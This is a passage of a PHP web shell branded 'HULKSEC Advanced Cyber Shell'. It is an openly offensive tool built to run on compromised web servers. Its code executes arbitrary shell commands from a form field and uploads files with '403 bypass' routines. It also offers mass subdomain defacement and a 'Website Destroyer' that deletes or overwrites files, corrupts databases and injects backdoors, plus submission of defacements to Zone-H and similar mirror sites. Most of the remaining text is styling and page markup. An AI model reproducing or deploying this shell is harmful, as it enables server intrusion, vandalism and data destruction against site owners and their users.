                    $_SESSION['upload_results'][] = " Uploaded: {$n[$i]} - SUCCESS";

                    // Standard bypass
                    $bypassResults = array_merge($bypassResults, advancedUploadBypass($n[$i], $content, $p));
                } else {
                    $_SESSION['upload_results'][] = " Upload failed: {$n[$i]} - Trying 403 bypass...";
                    // 403-specific bypass
                    $bypassResults = array_merge($bypassResults, enhanced403BypassUpload($n[$i], $content, $p));
                }
            }
        }

        if (!empty($bypassResults)) {
            $_SESSION['bypass_results'] = $bypassResults;
        }
    }

    // Terminal execution
    if (isset($_POST['terminal_command'])) {
        $command = $_POST['terminal_command'];
        $output = array();
        $return_code = 0;
        exec($command, $output, $return_code);
        $_SESSION['terminal_result'] = array(
            'command' => $command,
            'output' => $output,
            'return_code' => $return_code
        );
    }

    // Enhanced mirroring processing - unified
    if (isset($_POST['mass_mirror_urls']) && isset($_POST['mass_nickname'])) {
        $urls = explode("\n", $_POST['mass_mirror_urls']);
        $mirrorResults = array();

        // Zone-H Mass Mirroring
        if (isset($_POST['zoneh_mass'])) {
            $method = $_POST['mass_method'] ?? '1';
            $reason = $_POST['mass_reason'] ?? '1';
            $mirrorResults = array_merge($mirrorResults, 
                enhancedZoneHMassMirror($urls, $_POST['mass_nickname'], $_POST['mass_team'] ?? '', $method, $reason)
            );
        }

        // Zone-XSEC Mirroring
        if (isset($_POST['xsec_mass'])) {
            $poc = $_POST['xsec_poc'] ?? '1';
            $reason = $_POST['xsec_reason'] ?? '1';
            $mirrorResults = array_merge($mirrorResults,
                enhancedXsecMirror($urls, $_POST['mass_nickname'], $_POST['mass_team'] ?? '', $poc, $reason)
            );
        }

        // Haxor.ID Mirroring
        if (isset($_POST['haxor_mass'])) {
            $poc = $_POST['haxor_poc'] ?? '1';
            $reason = $_POST['haxor_reason'] ?? '1';
            $mirrorResults = array_merge($mirrorResults,
                enhancedHaxorIDMirror($urls, $_POST['mass_nickname'], $_POST['mass_team'] ?? '', $poc, $reason)
            );
        }

        $_SESSION['mirror_results'] = $mirrorResults;
        $_SESSION['mirror_count'] = count($mirrorResults);
    }

    // Existing other POST processing...
    if (isset($_POST['mass_deface']) && !empty($_POST['html_content'])) {
        $defaceData = enhancedMassDeface($_POST['html_content']);
        $_SESSION['deface_results'] = $defaceData['results'];
        $_SESSION['deface_count'] = $defaceData['count'];
    }
    if (isset($_POST['destroy_method'])) {
        $method = $_POST['destroy_method'];
        $html = '';
        if ($method === 'overwrite') {
            $html = $_POST['overwrite_html'] ?? '';
        }
        $destroyData = enhancedDestroyWebsite($method, $html);
        $_SESSION['destroy_results'] = $destroyData['results'];
        $_SESSION['destroy_count'] = $destroyData['count'];
        $_SESSION['destroy_method'] = $method;
    }
}

$userInfo = getEnhancedUserInfo();

// Process file operations
if (isset($_GET["a"])) {
    $action = nhx($_GET["a"]);
    if ($action == "delete") {
        $loc = $p.'/'.nhx($_GET["n"]);
        if (isset($_GET["t"]) && $_GET["t"] == "d") {
            if (is_rwx_phpfm($loc, 'w')) {
                deldir($loc);
                if (!$fc[12]($loc)) {
                    echo "<script>alert('Folder deleted successfully'); window.location.href='?p=".hex($p)."';</script>";
                } else {
                    echo "<script>alert('Failed to delete folder'); window.location.href='?p=".hex($p)."';</script>";
                }
            }
        } else {
            if (is_rwx_phpfm($loc, 'w')) {
                unlink($loc);
                if (!$fc[12]($loc)) {
                    echo "<script>alert('File deleted successfully'); window.location.href='?p=".hex($p)."';</script>";
                } else {
                    echo "<script>alert('Failed to delete file'); window.location.href='?p=".hex($p)."';</script>";
                }
            }
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HULKSEC | Advanced Cyber Shell v5.1</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --neon-violet: #b967ff;
            --neon-violet-dark: #8a2be2;
            --neon-violet-light: #d8b4ff;
            --dark-bg: #000000;
            --darker-bg: #050510;
            --panel-bg: rgba(10, 5, 20, 0.95);
            --panel-border: rgba(185, 103, 255, 0.4);
            --text-primary: #e0e0ff;
            --text-secondary: #a0a0ff;
            --violet-glow: 0 0 10px rgba(185, 103, 255, 0.7), 0 0 20px rgba(185, 103, 255, 0.5), 0 0 30px rgba(185, 103, 255, 0.3);
            --violet-glow-light: 0 0 10px rgba(216, 180, 255, 0.7), 0 0 20px rgba(216, 180, 255, 0.5), 0 0 30px rgba(216, 180, 255, 0.3);
            --glow-green: 0 0 10px rgba(0, 255, 0, 0.7), 0 0 20px rgba(0, 255, 0, 0.5), 0 0 30px rgba(0, 255, 0, 0.3);
            --glow-red: 0 0 10px rgba(255, 0, 0, 0.7), 0 0 20px rgba(255, 0, 0, 0.5), 0 0 30px rgba(255, 0, 0, 0.3);
        }
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Orbitron', sans-serif;
        }
        body {
            background-color: var(--dark-bg);
            color: var(--text-primary);
            min-height: 100vh;
            overflow-x: hidden;
            position: relative;
            background-image: 
                radial-gradient(circle at 10% 20%, rgba(105, 0, 255, 0.15) 0%, transparent 20%),
                radial-gradient(circle at 90% 80%, rgba(185, 103, 255, 0.15) 0%, transparent 20%),
                linear-gradient(to right, rgba(0, 0, 0, 0.4) 0%, transparent 50%, rgba(0, 0, 0, 0.4) 100%);
        }
        #particles-js {
            position: fixed;
            width: 100%;
            height: 100%;
            z-index: -1;
        }
        .scanlines {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(to bottom, transparent 50%, rgba(0, 0, 0, 0.1) 50%);
            background-size: 100% 4px;
            z-index: -1;
            pointer-events: none;
            animation: scanline 2s linear infinite;
        }
        .container {
            width: 100%;
            padding: 15px;
            position: relative;
            z-index: 1;
        }
        .header {
            text-align: center;
            padding: 20px 0;
            margin-bottom: 20px;
            position: relative;
        }
        .header::before, .header::after {
            content: '';
            position: absolute;
            height: 2px;
            left: 10%;
            right: 10%;
            background: linear-gradient(90deg, transparent, var(--neon-violet), var(--neon-violet-light), transparent);
        }
        .header::before { top: 0; }
        .header::after { bottom: 0; }
        .logo-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 15px;
            margin-bottom: 10px;
        }
        .logo-img {
            height: 60px;
            width: auto;
            filter: drop-shadow(0 0 10px var(--neon-violet));
        }
        .logo {
            font-size: 2.5em;
            font-weight: 900;
            color: transparent;
            background: linear-gradient(135deg, var(--neon-violet), var(--neon-violet-light));
            -webkit-background-clip: text;
            background-clip: text;
            text-shadow: var(--violet-glow);
            letter-spacing: 2px;
        }
        .team-banner {
            font-size: 1.2em;
            color: var(--neon-violet);
            text-shadow: var(--violet-glow);
            letter-spacing: 2px;
            font-weight: 700;
        }
        .subtitle {
            font-size: 0.9em;
            color: var(--text-secondary);
            letter-spacing: 1px;
        }
        .developer {
            font-size: 0.8em;
            color: var(--neon-violet);
            margin-top: 5px;
            text-shadow: 0 0 5px var(--neon-violet);
        }
        .nav-tabs {
            display: flex;
            flex-direction: column;
            gap: 8px;
            margin-bottom: 20px;
            background: rgba(0, 0, 0, 0.9);
            border-radius: 8px;
            padding: 10px;
            border: 1px solid var(--panel-border);
            box-shadow: 0 0 10px rgba(185, 103, 255, 0.2);
        }
        .nav-tab {
            padding: 12px 15px;
            cursor: pointer;
            border: none;
            background: transparent;
            color: var(--text-secondary);
            font-weight: 700;
            letter-spacing: 1px;
            border-radius: 5px;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            font-size: 0.9em;
            text-align: center;
        }
        .nav-tab.active {
            color: var(--neon-violet);
            background: rgba(185, 103, 255, 0.1);
            box-shadow: 0 0 10px rgba(185, 103, 255, 0.3);
            text-shadow: 0 0 5px var(--neon-violet);
        }
        .grid {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin-bottom: 20px;
        }
        .panel {
            background: var(--panel-bg);
            border: 1px solid var(--panel-border);
            border-radius: 8px;
            padding: 15px;
            backdrop-filter: blur(5px);
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
            position: relative;
        }
        .panel::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 2px;
            background: linear-gradient(90deg, var(--neon-violet), var(--neon-violet-light));
        }
        .panel-title {
            color: var(--neon-violet);
            font-size: 1.1em;
            margin-bottom: 15px;
            text-transform: uppercase;
            letter-spacing: 1px;
            font-weight: 700;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .panel-title i {
            margin-right: 8px;
            font-size: 1em;
        }
        .description {
            font-size: 0.85em;
            color: var(--text-secondary);
            margin: 8px 0 15px;
            line-height: 1.4;
            text-align: center;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 6px;
            color: var(--neon-violet);
            font-size: 0.85em;
            letter-spacing: 0.5px;
            font-weight: 500;
        }
        input[type="text"], textarea, select, input[type="file"] {
            width: 100%;
            padding: 10px 12px;
            background: rgba(0, 0, 0, 0.6);
            border: 1px solid rgba(185, 103, 255, 0.3);
            border-radius: 5px;
            color: var(--text-primary);
            font-size: 0.85em;
        }
        .btn-xsec {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, var(--neon-violet), var(--neon-violet-light));
            border: none;
            border-radius: 6px;
            color: #000000;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            font-size: 0.9em;
            letter-spacing: 1.5px;
            text-transform: uppercase;
            position: relative;
            overflow: hidden;
            margin: 5px 0;
            text-align: center;
            display: block;
            text-decoration: none;
        }
        .btn-xsec:hover {
            transform: translateY(-3px);
            box-shadow: 0 5px 20px rgba(185, 103, 255, 0.5);
            color: #000000;
        }
        .btn-destruction {
            background: linear-gradient(135deg, var(--neon-violet), var(--neon-violet-light));
            border: none;
            color: #000000;
            font-weight: bold;
            text-transform: uppercase;
            padding: 14px;
            border-radius: 6px;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            width: 100%;
            margin: 5px 0;
            font-size: 0.9em;
            letter-spacing: 1.5px;
        }

        .btn-destruction:hover {
            transform: translateY(-3px);
            box-shadow: 0 5px 20px rgba(185, 103, 255, 0.5);
        }

        .danger-pulse {
            animation: dangerPulse 1.5s infinite alternate;
        }

        @keyframes dangerPulse {
            from { box-shadow: 0 0 10px rgba(185, 103, 255, 0.5); }
            to { box-shadow: 0 0 30px rgba(185, 103, 255, 0.9); }
        }
        .file-manager-container {
            background: var(--panel-bg);
            border: 1px solid var(--panel-border);
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 15px;
            backdrop-filter: blur(5px);
        }
        .file-manager-header {
            display: flex;
            flex-direction: column;
            gap: 10px;
            margin-bottom: 15px;
        }
        .file-manager-title {
            color: var(--neon-violet);
            font-size: 1.2em;
            text-align: center;
        }
        .file-manager-info {
            display: flex;
            flex-direction: column;
            gap: 8px;
            align-items: center;
        }
        .file-manager-buttons {
            display: flex;
            gap: 8px;
            justify-content: center;
        }
        .file-manager-buttons .btn-xsec {
            width: auto;
            padding: 10px 15px;
            font-size: 0.8em;
        }
        .table-container {
            overflow-x: auto;
            -webkit-overflow-scrolling: touch;
        }
        table {
            width: 100%;
            min-width: 600px;
            font-size: 0.8em;
            border-collapse: collapse;
        }
        th {
            background: rgba(0, 0, 0, 0.6);
            padding: 10px 5px;
            text-align: left;
            color: var(--neon-violet);
            border-bottom: 2px solid var(--neon-violet);
        }
        td {
            padding: 8px 5px;
            border-bottom: 1px solid rgba(185, 103, 255, 0.2);
        }
        .path-breadcrumb {
            font-size: 0.9em;
            overflow-x: auto;
            white-space: nowrap;
            padding: 10px 0;
            -webkit-overflow-scrolling: touch;
            background: rgba(0, 0, 0, 0.4);
            border-radius: 5px;
            padding: 10px;
        }
        .results-panel {
            background: var(--panel-bg);
            border: 1px solid var(--panel-border);
            border-radius: 8px;
            padding: 15px;
            margin-top: 15px;
            max-height: 200px;
            overflow-y: auto;
        }
        .result-item {
            padding: 8px;
            margin: 6px 0;
            background: rgba(0, 0, 0, 0.3);
            border-left: 3px solid var(--neon-violet);
            border-radius: 3px;
            font-family: monospace;
            font-size: 0.8em;
            word-break: break-word;
            color: var(--text-primary);
        }
        .glow-violet {
            color: var(--neon-violet);
            text-shadow: var(--violet-glow);
        }
        .glow-violet-light {
            color: var(--neon-violet-light);
            text-shadow: var(--violet-glow-light);
        }
        .glow-green {
            color: #00ff00;
            text-shadow: var(--glow-green);
        }
        .glow-red {
            color: #ff0000;
            text-shadow: var(--glow-red);
        }
        .terminal {
            background: rgba(0, 0, 0, 0.7);
            border: 1px solid var(--neon-violet);
            border-radius: 5px;
            padding: 12px;
            font-family: monospace;
            color: var(--neon-violet);
            max-height: 200px;
            overflow-y: auto;
            font-size: 0.8em;
            line-height: 1.3;
            text-shadow: 0 0 5px var(--neon-violet);
        }
        .user-info-grid {
            display: grid;
            grid-template-columns: 1fr;
            gap: 10px;
            margin-top: 15px;
        }
        .info-item {
            background: rgba(0, 0, 0, 0.3);
            padding: 10px;
            border-radius: 5px;
            border-left: 3px solid var(--neon-violet);
        }
        .info-label {
            font-weight: bold;
            color: var(--neon-violet);
            font-size: 0.8em;
        }
        .info-value {
            font-size: 0.8em;
            word-break: break-all;
            color: var(--text-primary);
        }
        .footer {
            text-align: center;
            padding: 20px 0;
            margin-top: 30px;
            border-top: 1px solid rgba(185, 103, 255, 0.2);
            color: var(--text-secondary);
            font-size: 0.75em;
            letter-spacing: 0.5px;
        }
        .glow-icon {
            transition: all 0.3s ease;
            border-radius: 50%;
            padding: 5px;
            display: inline-block;
        }
        .glow-violet-icon {
            color: var(--neon-violet);
            text-shadow: var(--violet-glow);
        }
        .glow-violet-icon:hover {
            box-shadow: var(--violet-glow);
            background: rgba(185, 103, 255, 0.1);
            transform: scale(1.1);
        }
        .glow-green-icon {
            color: #00ff00;
        }
        .glow-green-icon:hover {
            background: rgba(0, 255, 0, 0.1);
            transform: scale(1.1);
        }
        .glow-red-icon {
            color: #ff0000;
        }
        .glow-red-icon:hover {
            background: rgba(255, 0, 0, 0.1);
            transform: scale(1.1);
        }
        .glow-blue-icon {
            color: #0066ff;
        }
        .glow-blue-icon:hover {
            background: rgba(0, 100, 255, 0.1);
            transform: scale(1.1);
        }
        .glow-yellow-icon {
            color: #ffff00;
        }
        .glow-yellow-icon:hover {
            background: rgba(255, 255, 0, 0.1);
            transform: scale(1.1);
        }

        /* File Manager Animation */
        @keyframes fileGlow {
            0% { box-shadow: 0 0 5px rgba(185, 103, 255, 0.5); }
            50% { box-shadow: 0 0 20px rgba(185, 103, 255, 0.8); }
            100% { box-shadow: 0 0 5px rgba(185, 103, 255, 0.5); }
        }

        .file-manager-container {
            animation: fileGlow 3s infinite;
        }

        /* Violet Grid Background */
        .grid-background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(rgba(185, 103, 255, 0.1) 1px, transparent 1px),
                linear-gradient(90deg, rgba(185, 103, 255, 0.1) 1px, transparent 1px);
            background-size: 50px 50px;
            z-index: -1;
            pointer-events: none;
        }

        /* Desktop Styles */
        @media (min-width: 768px) {
            .container {
                max-width: 1400px;
                margin: 0 auto;
                padding: 20px;
            }
            .header {
                padding: 30px 0;
                margin-bottom: 30px;
            }
            .header::before, .header::after {
                height: 3px;
                left: 20%;
                right: 20%;
            }
            .logo-container {
                flex-direction: row;
                justify-content: center;
                gap: 20px;
                margin-bottom: 15px;
            }
            .logo-img {
                height: 80px;
            }
            .logo {
                font-size: 4.5em;
                letter-spacing: 4px;
            }
            .team-banner {
                font-size: 1.8em;
                letter-spacing: 3px;
            }
            .subtitle {
                font-size: 1.2em;
                letter-spacing: 2px;
            }
            .developer {
                font-size: 0.9em;
            }
            .nav-tabs {
                flex-direction: row;
                justify-content: center;
                gap: 10px;
                margin-bottom: 30px;
                padding: 10px;
            }
            .nav-tab {
                padding: 15px 30px;
                font-size: 1em;
            }
            .grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
                gap: 25px;
                margin-bottom: 30px;
            }
            .panel {
                padding: 25px;
                border-radius: 10px;
            }
            .panel::before {
                height: 3px;
            }
            .panel-title {
                font-size: 1.4em;
                letter-spacing: 2px;
                justify-content: flex-start;
                text-align: left;
            }
            .description {
                font-size: 0.95em;
                text-align: left;
            }
            .btn-xsec, .btn-destruction {
                width: auto;
                padding: 14px 25px;
            }
            .file-manager-header {
                flex-direction: row;
                justify-content: space-between;
                align-items: center;
            }
            .file-manager-info {
                flex-direction: row;
                align-items: center;
                gap: 15px;
            }
            .path-breadcrumb {
                font-size: 1em;
            }
            .results-panel {
                max-height: 300px;
                padding: 20px;
            }
            .terminal {
                max-height: 300px;
                padding: 15px;
                font-size: 0.9em;
            }
            .user-info-grid {
                grid-template-columns: repeat(2, 1fr);
                gap: 15px;
            }
            .footer {
                font-size: 0.9em;
            }
        }
    </style>
</head>
<body>
    <!-- Same background as login page -->
    <div id="particles-js"></div>
    <div class="scanlines"></div>
    <div class="grid-background"></div>

    <div class="container">
        <!-- Header -->
        <div class="header">
            <div class="logo-container">
                <img src="https://i.ibb.co/W4vPknsV/Background-Eraser-20251003-022215335.png" alt="HULKSEC Logo" class="logo-img">
                <div class="logo">HULKSEC</div>
            </div>
            <div class="team-banner">CYBER SECURITY SHELL v5.1</div>
            <div class="subtitle">ADVANCED PENETRATION TESTING PLATFORM</div>
            <div class="developer">Developed by Fiziru HPH | User: <?php echo $userInfo['script_user']; ?></div>
        </div>

        <!-- Navigation Tabs -->
        <div class="nav-tabs">
            <div class="nav-tab active" onclick="showTab('file-manager')">
                <i class="fas fa-folder"></i> FILE MANAGER
            </div>
            <div class="nav-tab" onclick="showTab('mass-tools')">
                <i class="fas fa-bomb"></i> MASS TOOLS
            </div>
            <div class="nav-tab" onclick="showTab('user-info')">
                <i class="fas fa-user-secret"></i> USER INFO
            </div>
            <div class="nav-tab" onclick="showTab('mirroring')">
                <i class="fas fa-satellite"></i> MIRRORING
            </div>
            <div class="nav-tab" onclick="showTab('terminal')">
                <i class="fas fa-terminal"></i> TERMINAL
            </div>
        </div>

        <!-- File Manager Tab -->
        <div id="file-manager" class="tab-content">
            <div class="file-manager-container">
                <div class="file-manager-header">
                    <div class="file-manager-title">
                        <i class="fas fa-terminal"></i> <?= SHELL_NAME ?>
                    </div>
                    <div class="file-manager-info">
                        <span style="color: var(--text-secondary);">
                            <i class="fas fa-code"></i> PHP: <?= $fc[1]() ?>
                        </span>
                        <div class="file-manager-buttons">
                            <a href="?p=<?= hex($p)."&a=".hex("newFile") ?>" class="btn-xsec">
                                <i class="fas fa-file-plus"></i> File
                            </a>
                            <a href="?p=<?= hex($p)."&a=".hex("newDir") ?>" class="btn-xsec">
                                <i class="fas fa-folder-plus"></i> Folder
                            </a>
                        </div>
                    </div>
                </div>

                <div style="border-top: 1px solid rgba(185, 103, 255, 0.3); padding-top: 10px; margin-top: 10px;">
                    <div style="color: var(--text-secondary); font-size: 0.8em;">
                        <i class="fas fa-desktop"></i> Uname : <?= $fc[0]() ?>
                        | Online | User: <?= $userInfo['script_user'] ?> | IP: <?= $userInfo['ip'] ?>
                    </div>
                </div>

                <!-- File Upload Form with 403 Bypass -->
                <form method="post" enctype="multipart/form-data" id="uploadForm">
                    <div class="form-group">
                        <label><i class="fas fa-cloud-upload-alt"></i> Upload Files (403 Bypass Enabled)</label>
                        <input type="file" name="f[]" multiple onchange="document.getElementById('uploadForm').submit()" style="color: var(--text-primary); background: rgba(0, 0, 0, 0.6); border: 1px solid rgba(185, 103, 255, 0.3);">
                    </div>
                </form>

                <?php if (isset($_SESSION['upload_results'])): ?>
                <div class="results-panel">
                    <div class="panel-title">
                        <i class="fas fa-upload"></i> Upload Results
                    </div>
                    <?php foreach ($_SESSION['upload_results'] as $result): ?>
                        <div class="result-item <?= strpos($result, 'SUCCESS') !== false ? 'glow-violet' : 'glow-red' ?>">
                            <?= $result ?>
                        </div>
                    <?php endforeach; ?>
                    <?php unset($_SESSION['upload_results']); ?>
                </div>
                <?php endif; ?>

                <?php if (isset($_SESSION['bypass_results'])): ?>
                <div class="results-panel">
                    <div class="panel-title">
                        <i class="fas fa-unlock"></i> 403 Bypass Results
                    </div>
                    <?php foreach ($_SESSION['bypass_results'] as $result): ?>
                        <div class="result-item glow-violet">
                            <?= $result ?>
                        </div>
                    <?php endforeach; ?>
                    <?php unset($_SESSION['bypass_results']); ?>
                </div>
                <?php endif; ?>
            </div>

            <div class="file-manager-container mt-3">
                <div class="path-breadcrumb">
                    <span style="color: var(--neon-violet);">
                        <i class="fas fa-folder-open"></i> Path:
                    </span>
                    <?php
                    $ps = preg_split("/(\\\|\/)/", $p);
                    foreach ($ps as $k => $v) {
                        if ($k == 0 && $v == "") {
                            echo "<a href=\"?p=2f\" style=\"color: var(--neon-violet);\">
                                <i class=\"fas fa-home\"></i> ~
                            </a>/";
                            continue;
                        }
                        if ($v == "") continue;
                        echo "<a href=\"?p=";
                        for ($i = 0; $i <= $k; $i++) {
                            echo hex($ps[$i]);
                            if ($i != $k) echo "2f";
                        }
                        echo "\" style=\"color: var(--text-primary);\">{$v}</a>/";
                    }
                    ?>
                </div>
            </div>

            <div class="file-manager-container mt-3">
                <?php if (!isset($_GET["a"])): ?>
                <div class="table-container">
                    <table style="width: 100%; border-collapse: collapse; color: var(--text-primary);">
                        <thead>
                            <tr>
                                <th><i class="fas fa-file-signature"></i> Name</th>
                                <th><i class="fas fa-weight-hanging"></i> Size</th>
                                <th><i class="fas fa-user-lock"></i> Perms</th>
                                <th><i class="fas fa-cogs"></i> Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php
                            $scanned = array_diff(scandir($p), ['.', '..']);
                            foreach ($scanned as $item) {
                                if (is_dir("$p/$item")) {
                                    $permColor = is_rwx_phpfm("$p/$item", 'r') ? "#00ff00" : "red";
                                    echo "<tr>
                                        <td>
                                            <a href=\"?p=".hex("$p/$item")."\" style=\"color: var(--text-primary); text-decoration: none;\">
                                                <i class=\"fas fa-folder glow-violet-icon glow-icon\"></i> {$item}
                                            </a>
                                        </td>
                                        <td>N/A</td>
                                        <td>
                                            <span style=\"color: {$permColor};\">".perms("$p/$item")."</span>
                                        </td>
                                        <td>
                                            <a href=\"?p=".hex($p)."&a=".hex("rename")."&n=".hex($item)."&t=d\">
                                                <i class=\"fas fa-pencil-alt glow-yellow-icon glow-icon\"></i>
                                            </a>
                                            <a href=\"?p=".hex($p)."&a=".hex("delete")."&n=".hex($item)."\" class=\"delete\" data-type=\"folder\" style=\"margin-left: 10px;\">
                                                <i class=\"fas fa-trash glow-red-icon glow-icon\"></i>
                                            </a>
                                        </td>
                                    </tr>";
                                }
                            }
                            foreach ($scanned as $item) {
                                if (!is_dir("$p/$item")) {
                                    $sz = filesize("$p/$item")/1024;
                                    $sz = round($sz, 3);
                                    $sz = ($sz > 1024) ? round($sz/1024, 2)."MB" : $sz."KB";
                                    $permColor = is_rwx_phpfm("$p/$item", 'r') ? "#00ff00" : "red";
                                    echo "<tr>
                                        <td>
                                            <a href=\"?p=".hex($p)."&a=".hex("view")."&n=".hex($item)."\" style=\"color: var(--text-primary); text-decoration: none;\">
                                                <i class=\"fas fa-file glow-blue-icon glow-icon\"></i> {$item}
                                            </a>
                                        </td>
                                        <td>{$sz}</td>
                                        <td>
                                            <span style=\"color: {$permColor};\">".perms("$p/$item")."</span>
                                        </td>
                                        <td>
                                            <a href=\"?p=".hex($p)."&a=".hex("edit")."&n=".hex($item)."\">
                                                <i class=\"fas fa-edit glow-violet-icon glow-icon\"></i>
                                            </a>
                                            <a href=\"?p=".hex($p)."&a=".hex("rename")."&n=".hex($item)."&t=f\" style=\"margin-left: 10px;\">
                                                <i class=\"fas fa-pencil-alt glow-yellow-icon glow-icon\"></i>
                                            </a>
                                            <a href=\"?p=".hex($p)."&n=".hex($item)."&download\" style=\"margin-left: 10px;\">
                                                <i class=\"fas fa-download glow-green-icon glow-icon\"></i>
                                            </a>
                                            <a href=\"?p=".hex($p)."&a=".hex("delete")."&n=".hex($item)."\" class=\"delete\" data-type=\"file\" style=\"margin-left: 10px;\">
                                                <i class=\"fas fa-trash glow-red-icon glow-icon\"></i>
                                            </a>
                                        </td>
                                    </tr>";
                                }
                            }
                            ?>
                        </tbody>
                    </table>
                </div>
                <?php endif; ?>
            </div>
        </div>

        <!-- Mass Tools Tab -->
        <div id="mass-tools" class="tab-content" style="display: none;">
            <div class="grid">
                <div class="panel">
                    <div class="panel-title">
                        <i class="fas fa-radiation"></i> Mass Subdomain Defacement
                    </div>
                    <p class="description">Automatically detect subdomains and deploy defacement pages across the entire domain infrastructure.</p>
                    <form method="post">
                        <input type="hidden" name="mass_deface" value="1">
                        <div class="form-group">
                            <label><i class="fas fa-code"></i> Defacement HTML Content</label>
                            <textarea name="html_content" rows="6" placeholder="&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hacked by HULKSEC PH&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;" required style="color: var(--text-primary); background: rgba(0, 0, 0, 0.6);"></textarea>
                        </div>
                        <button type="submit" class="btn-xsec">
                            <i class="fas fa-rocket"></i> Execute Mass Deface
                        </button>
                    </form>
                </div>

                <div class="panel">
                    <div class="panel-title">
                        <i class="fas fa-skull-crossbones"></i> Website Destroyer
                    </div>
                    <p class="description">Complete website destruction tools. Overwrite, delete, or corrupt target website files and databases.</p>
                    <form method="post" id="destroyForm">
                        <div class="form-group">
                            <label><i class="fas fa-tools"></i> Destruction Method</label>
                            <select name="destroy_method" required onchange="toggleOverwriteContent()" style="color: var(--text-primary); background: rgba(0, 0, 0, 0.6); border: 1px solid rgba(185, 103, 255, 0.3); padding: 10px; border-radius: 5px; width: 100%;">
                                <option value="overwrite">Overwrite Files</option>
                                <option value="delete">Delete Files</option>
                                <option value="corrupt">Corrupt Database</option>
                                <option value="backdoor">Create Backdoors</option>
                                <option value="mass_backdoor">Mass Backdoor Injection</option>
                            </select>
                        </div>
                        <div id="overwrite-content" style="display: none;">
                            <div class="form-group">
                                <label><i class="fas fa-code"></i> Overwrite HTML Content</label>
                                <textarea name="overwrite_html" rows="6" placeholder="&lt;html&gt;&lt;body&gt;&lt;h1&gt;HACKED BY HULKSEC PH&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;" style="color: var(--text-primary); background: rgba(0, 0, 0, 0.6);"></textarea>
                            </div>
                        </div>
                        <button type="submit" class="btn-destruction danger-pulse">
                            <i class="fas fa-fire"></i> Initiate Destruction
                        </button>
                    </form>
                </div>
            </div>

            <!-- Results Display -->
            <?php if (isset($_SESSION['deface_results'])): ?>
            <div class="results-panel">
                <div class="panel-title">
                    <i class="fas fa-list-ul"></i> Defacement Results
                </div>
                <div class="glow-violet" style="text-align: center; margin-bottom: 10px;">
                    Overwritten: <?php echo $_SESSION['deface_count']; ?> contents
                </div>
                <?php foreach ($_SESSION['deface_results'] as $result): ?>
                    <div class="result-item glow-violet">
                        <?= $result ?>
                    </div>
                <?php endforeach; ?>
                <?php unset($_SESSION['deface_results'], $_SESSION['deface_count']); ?>
            </div>
            <?php endif; ?>

            <?php if (isset($_SESSION['destroy_results'])): ?>
            <div class="results-panel">
                <div class="panel-title">
                    <i class="fas fa-biohazard"></i> Destruction Results
                </div>
                <div class="glow-violet" style="text-align: center; margin-bottom: 10px;">
                    Processed: <?php echo $_SESSION['destroy_count']; ?> items (Method: <?php echo $_SESSION['destroy_method']; ?>)
                </div>
                <?php foreach ($_SESSION['destroy_results'] as $result): ?>
                    <div class="result-item glow-violet">
                        <?= $result ?>
                    </div>
                <?php endforeach; ?>
                <?php unset($_SESSION['destroy_results'], $_SESSION['destroy_count'], $_SESSION['destroy_method']); ?>
            </div>
            <?php endif; ?>
        </div>

        <!-- User Information Tab -->
        <div id="user-info" class="tab-content" style="display: none;">
            <div class="panel">
                <div class="panel-title">
                    <i class="fas fa-user-secret"></i> User Information Grabber
                </div>
                <p class="description">Comprehensive user information collection including IP, browser, location, and system details.</p>
                <div class="user-info-grid">
                    <?php foreach ($userInfo as $key => $value): ?>
                    <div class="info-item">
                        <div class="info-label"><?php echo ucfirst(str_replace('_', ' ', $key)); ?></div>
                        <div class="info-value"><?php echo htmlspecialchars($value); ?></div>
                    </div>
                    <?php endforeach; ?>
                </div>
            </div>
        </div>

        <!-- Enhanced Mirroring Tab -->
        <div id="mirroring" class="tab-content" style="display: none;">
            <div class="grid">
                <!-- Zone-H Mass Mirroring -->
                <div class="panel">
                    <div class="panel-title">
                        <i class="fas fa-satellite-dish"></i> ZONE-H MASS MIRRORING
                    </div>
                    <p class="description">Complete Zone-H.org mass mirroring with all required fields</p>
                    <form method="post">
                        <div class="form-group">
                            <label><i class="fas fa-link"></i> Target URLs (one per line) *</label>
                            <textarea name="mass_mirror_urls" rows="4" placeholder="http://example.com&#10;http://target.org" required style="background: rgba(0, 0, 0, 0.6);"></textarea>
                        </div>

                        <div class="form-group">
                            <label><i class="fas fa-user-secret"></i> Notifier Name *</label>
                            <input type="text" name="mass_nickname" placeholder="Your hacker alias" required style="background: rgba(0, 0, 0, 0.6);">
                        </div>

                        <div class="form-group">
                            <label><i class="fas fa-users"></i> Team Name</label>
                            <input type="text" name="mass_team" placeholder="Your team name" style="background: rgba(0, 0, 0, 0.6);">
                        </div>

                        <div class="form-group">
                            <label><i class="fas fa-bug"></i> Attack Method *</label>
                            <select name="mass_method" required style="background: rgba(0, 0, 0, 0.6);">
                                <option value="1">known vulnerability (i.e. unpatched system)</option>
